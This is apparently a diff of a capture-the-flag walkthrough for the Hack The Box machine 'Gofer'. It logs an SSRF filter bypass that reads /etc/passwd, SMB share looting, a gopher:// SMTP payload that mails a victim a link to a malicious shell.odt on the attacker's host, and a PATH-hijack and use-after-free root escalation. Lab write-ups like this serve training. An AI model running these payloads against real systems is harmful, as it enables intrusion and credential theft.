@@ -46,8 +46,8 @@ echo "10.10.11.225 gofer.htb" | sudo tee -a /etc/hosts
 - Tom Buckley - CTO 
 - Amanda Blake - Accountant 
 
-wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 400,301 -H 'Host:FUZZ.gofer.htb' http://gofer.htb
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+**┌─[xbutch@parrot]─[~]
+└──╼ $wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 400,301 -H 'Host:FUZZ.gofer.htb' http://gofer.htb**
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
@@ -61,28 +61,28 @@ ID           Response   Lines    Word       Chars       Payload
 
 000001171:   401        14 L     54 W       462 Ch      "proxy" 
 
-┌─[xbutch@parrot]─[~]
-└──╼ $curl -X POST http://proxy.gofer.htb/index.php
+**┌─[xbutch@parrot]─[~]
+└──╼ $curl -X POST http://proxy.gofer.htb/index.php**
 
 <!-- Welcome to Gofer proxy -->
 <html><body>Missing URL parameter !</body></html>
 
-┌─[xbutch@parrot]─[~]
-└──╼ $curl -X POST -d 'URL=http://10.10.16.26' http://proxy.gofer.htb/index.php
+**┌─[xbutch@parrot]─[~]
+└──╼ $curl -X POST -d 'URL=http://10.10.16.26' http://proxy.gofer.htb/index.php**
 <!-- Welcome to Gofer proxy -->
 <html><body>Missing URL parameter !</body></html>
 
-┌─[xbutch@parrot]─[~]
-└──╼ $curl -X POST http://proxy.gofer.htb/index.php?url=http://10.10.16.26
+**┌─[xbutch@parrot]─[~]
+└──╼ $curl -X POST http://proxy.gofer.htb/index.php?url=http://10.10.16.26**
 <!-- Welcome to Gofer proxy -->
 
-┌─[xbutch@parrot]─[~]
-└──╼ $curl -X POST http://proxy.gofer.htb/index.php?url=file:///etc/passwd
+**┌─[xbutch@parrot]─[~]
+└──╼ $curl -X POST http://proxy.gofer.htb/index.php?url=file:///etc/passwd**
 <!-- Welcome to Gofer proxy -->
 <html><body>Blacklisted keyword: file:// !</body></html>
 
-┌─[xbutch@parrot]─[~]
-└──╼ $curl -X POST http://proxy.gofer.htb/index.php?url=file:/etc/passwd
+**┌─[xbutch@parrot]─[~]
+└──╼ $curl -X POST http://proxy.gofer.htb/index.php?url=file:/etc/passwd**
 <!-- Welcome to Gofer proxy -->
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -117,8 +117,8 @@ ablake:x:1003:1003::/home/ablake:/bin/bash
 tcpdump:x:107:117::/nonexistent:/usr/sbin/nologin
 _laurel:x:998:998::/var/log/laurel:/bin/false
 
-┌─[xbutch@parrot]─[~]
-└──╼ $smbmap -H 10.10.11.225
+**┌─[xbutch@parrot]─[~]
+└──╼ $smbmap -H 10.10.11.225**
 [+] IP: 10.10.11.225:445	Name: gofer.htb                                         
         Disk                                                  	Permissions	Comment
 	----                                                  	-----------	-------
@@ -126,8 +126,8 @@ _laurel:x:998:998::/var/log/laurel:/bin/false
 	**shares**                                            	READ ONLY	
 	IPC$                                              	NO ACCESS	IPC Service (Samba 4.13.13-Debian)
 
-┌─[xbutch@parrot]─[~]
-└──╼ $smbclient //gofer.htb/shares
+**┌─[xbutch@parrot]─[~]
+└──╼ $smbclient //gofer.htb/shares**
 Password for [WORKGROUP\xbutch]:
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -145,8 +145,8 @@ smb: \.backup\> ls
 smb: \.backup\> get mail
 getting file \.backup\mail of size 1101 as mail (3,0 KiloBytes/sec) (average 3,0 KiloBytes/sec)
 
-┌─[xbutch@parrot]─[~]
-└──╼ $cat mail
+**┌─[xbutch@parrot]─[~]
+└──╼ $cat mail**
 From **jdavis@gofer.htb**  Fri Oct 28 20:29:30 2022
 Return-Path: <jdavis@gofer.htb>
 X-Original-To: tbuckley@gofer.htb
@@ -212,3 +212,168 @@ if(!empty($_GET["url"])) {
 250 2.0.0 Ok: queued as 38F58814F
 221 2.0.0 Bye
 1
+
+https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html
+
+curl -X POST "http://proxy.gofer.htb/index.php?url=gopher%3A%2F%2F0.0.0.0%3A25%2F_HELO%20gofer.htb%250AMAIL%20FROM%3A%20%3Chacker%40site.com%3E%250ARCPT%20TO%3A%20%3Cjhudson%40gofer.htb%3E%250ADATA%250ASubject%3A%20TEST%250A%3Ca%20href%3Dhttp%3A%2F%2F10.10.16.53%2Fshell.odt%3Eclick%3C%2Fa%3E%250A.%250AQUIT"
+
+
+**jhudson@gofer:/usr/bin$ id**
+uid=1000(jhudson) gid=1000(jhudson) groups=1000(jhudson),108(netdev)
+**jhudson@gofer:/usr/bin$ cd ~**
+**jhudson@gofer:~$ ls**
+Downloads  linpeas.sh  user.txt
+**jhudson@gofer:~$ cat user.txt**
+********************************
+
+**jhudson@gofer:~$ find / -type f -perm -4000 2>/dev/null**
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/local/bin/not
+
+**jhudson@gofer:~$ ls -la /usr/local/bin/notes**
+-rwsr-s--- 1 root dev 17168 Apr 28 16:06 /usr/local/bin/notes
+You have new mail in /var/mail/jhudson
+
+/usr/bin/curl http://proxy.gofer.htb/?url=http://gofer.htb --user tbuckley:*******************
+
+**jhudson@gofer:~$ su tbuckley**
+Password: ***************
+
+**tbuckley@gofer:/home/jhudson$ id
+**uid=1002(tbuckley) gid=1002(tbuckley) groups=1002(tbuckley),1004(dev)
+tbuckley@gofer:/home/jhudson$ /usr/local/bin/notes
+'========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 9
+9
+
+tbuckley@gofer:/home/jhudson$ ls
+ls
+Downloads  linpeas.sh  tar  user.txt
+tbuckley@gofer:/home/jhudson$ chmod 777 tar
+chmod 777 tar
+chmod: changing permissions of 'tar': Operation not permitted
+tbuckley@gofer:/home/jhudson$ rm tar
+rm tar
+rm: cannot remove 'tar': Permission denied
+tbuckley@gofer:/home/jhudson$ cd /home/tbuckley
+cd /home/tbuckley
+tbuckley@gofer:~$ ls
+tmp
+tbuckley@gofer:~$ cd
+tbuckley@gofer:~$ echo '#!/bin/bash' > tar
+tbuckley@gofer:~$ echo 'chmod u+s /bin/bash' >> tar
+tbuckley@gofer:~$ chmod 777 tar
+tbuckley@gofer:~$ export PATH=~:$PATH
+**tbuckley@gofer:~$ /usr/local/bin/notes 
+**'========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 1
+
+Choose an username: butch
+
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 3
+
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 4
+
+Write your note:
+123456789012345678901234admin
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 8
+
+Access granted!
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 9
+
+**tbuckley@gofer:~$ ls -la /bin/bash**
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+**tbuckley@gofer:~$ /bin/bash -p**
+**bash-5.1# id**
+uid=1002(tbuckley) gid=1002(tbuckley) euid=0(root) groups=1002(tbuckley),1004(dev)
+**bash-5.1# cd /root**
+**bash-5.1# cat root.txt**
+********************************
